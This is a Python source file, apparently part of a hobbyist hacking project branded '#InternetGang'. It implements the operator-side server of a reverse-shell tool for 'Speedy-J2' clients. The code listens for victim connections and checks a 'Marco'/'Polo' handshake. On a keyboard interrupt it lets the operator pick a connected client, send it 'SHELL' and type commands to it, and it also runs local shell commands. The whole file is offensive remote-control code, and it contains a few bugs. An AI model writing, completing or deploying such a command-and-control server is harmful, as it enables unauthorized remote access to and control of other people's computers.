"""

                               .,,uod8B8bou,,.
                      ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
                 ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
                 !...:!TVBBBRPFT||||||||||!!^^""'   ||||
                 !.......:!?|||||!!^^""'            ||||
                 !.........||||                     ||||
                 !.........||||  #ɪɴᴛᴇʀɴᴇᴛGang      ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 `.........||||  ,                 ,||||
                  .;.......||||  ;..-         _.-!!|||||
           .,uodWBBBBb.....||||       _.-!!|||||||||!:'
        !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
        !..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
        !....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
        !......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
        !........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
        `..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
          `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
            `........::::::::::::::::;iof688888888888888888888b.     `
              `......:::::::::;iof688888888888888888888888888888b.
                `....:::;iof688888888888888888888888888888888899fT!
                  `..::!8888888888888888888888888888888899fT|!^"'
                    `' !!988888888888888888888888899fT|!^"'
                        `!!8888888888888888899fT|!^"'
                          `!988888888899fT|!^"'
                            `!9899fT|!^"'
                              `!^"'


Server for reverse shelling with Speedy-J2 clients

Drop into a shell with keyboardInterrupt:
        - Send everything after a SEND
        - No padding, max 1024 bytes, end with b' AYE'
        - Exit with 'exit()'

"""
import subprocess
import selectors
import socket
import types
import time
import sys

HOST = '127.0.0.1'
PORT = int(sys.argv[1])

sel = selectors.DefaultSelector()

# Listening socket, TCP, IPv4
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((HOST, PORT))
lsock.listen()
print('listening on', (HOST, PORT))

# Set socket in non-blocking mode
lsock.setblocking(False)
# Register the socket to be monitored with sel.select() for read events
sel.register(lsock, selectors.EVENT_READ, data=None)

# E.g.:
poison_pill = "kill -9 $(pgrep -f server.py)"




def subp_run(command):
    return subprocess.run(command, shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,
                          stdin=subprocess.PIPE,
                          timeout=None)


def accept_wrapper(sock):
    conn, addr = sock.accept()  # Ready to read
    print(f'Accepted client {addr}')
    conn.setblocking(False)
    data = types.SimpleNamespace(addr=addr, inb=b'', outb=b'')
    events = selectors.EVENT_READ | selectors.EVENT_WRITE
    sel.register(conn, events, data=data)


def test_connection(key, mask):
    sock = key.fileobj
    data = key.data
    if mask & selectors.EVENT_READ:  # Sock can be read
        print("EV READ")
        recv_data = sock.recv(5)
        if recv_data:
            print(recv_data.decode())
            assert recv_data == b'Marco'
            data.outb += b'Polo'
        else:
            print("Received nothing from", data.addr)
            time.sleep(2)
    if mask & selectors.EVENT_WRITE:
        sent = sock.send(data.outb)  # Returns the number of bytes sent
        data.outb = data.outb[sent:]


def ioloop(s: socket):
    while True:
        data = input(f"{s.getpeername()[0]}: ")
        if data[:5] == 'SEND ':
            print(data[5:])
            s.send(data[5:].encode())
            assert len(data[5:]) <= 1024
            assert data[:-4] == ' AYE'

        elif data == 'exit()':
            break

conns = []

# The event loop
try:
    while True:
        try:
            events = sel.select(timeout=None)  # blocks until there are sockets ready
            # It returns a k, v for each socket, key.fileobj contains the socket
            # If key.data is None we know its from the listening socket
            for key, mask in events:
                if key.data is None:
                    accept_wrapper(key.fileobj)
                else:
                    test_connection(key, mask)
                    conns.append((key, mask))

        except KeyboardInterrupt as interception:

            i = 0
            print("\nAvailable clients: ")
            print(len(conns))
            for i in range(len(conns)):
                clientk = conns[i][0]
                print(f'{i}' + ': ', clientk.data.addr, '\t')
                selected = int(input("Select a client to shell with: "))
                if selected in range(len(conns)):
                    print("Welcome to ", clientk.data.addr)
                    sock = clientk.fileobj
                    sock.send(b'SHELL')
                    ioloop(sock)

                    pass




            sp = subp_run(input("Now what"))
            sp.check_returncode()
            print(sp.stdout.decode('utf-8'))

except:
    lsock.close()
    sys.exit(1)
